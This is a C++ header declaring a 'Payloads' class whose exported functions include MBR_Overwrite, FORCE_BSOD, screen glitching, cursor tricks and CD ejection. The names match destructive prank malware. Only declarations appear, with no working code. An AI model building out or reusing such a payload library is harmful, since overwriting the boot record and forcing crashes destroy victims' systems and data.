#pragma once

#include "resource.h"

#include <stdio.h>
#include <conio.h>
#include <stdexcept>
#include <ctime>

namespace Payloads
{
	class Payloads
	{
	public:
		__declspec(dllexport) void MBR_Overwrite();
		__declspec(dllexport) void FORCE_BSOD();
		__declspec(dllexport) void Screen_Glitching();
		__declspec(dllexport) void Screen_Screw();
		__declspec(dllexport) void Display_Icons();
		__declspec(dllexport) void EjectCD();
		__declspec(dllexport) void CursorIcon();
		__declspec(dllexport) void CrazyBounce();
		__declspec(dllexport) void Flip();
		__declspec(dllexport) void Text();
		__declspec(dllexport) int ChangeAllText();
	private:
		
	};
}